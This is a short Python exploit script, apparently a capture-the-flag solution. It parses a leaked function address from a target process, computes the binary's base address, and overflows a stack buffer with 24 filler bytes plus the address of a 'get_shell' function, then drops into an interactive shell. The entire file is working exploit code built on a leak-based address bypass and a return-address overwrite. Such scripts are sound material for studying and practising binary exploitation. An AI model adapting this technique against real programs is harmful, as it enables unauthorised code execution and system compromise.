import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('------------- /!\ NEW STACKFRAME ALLOCATED /!\ -------------'))
p.readline()
infoleak_line = p.readline()
print(infoleak_line.split(" "))
do_func = int(infoleak_line.split(" ")[-1], 16)
base = do_func - 0x1972
get_shell = base + 0x1a7a
p.sendline('A'*24 + p64(get_shell))

p.interactive()
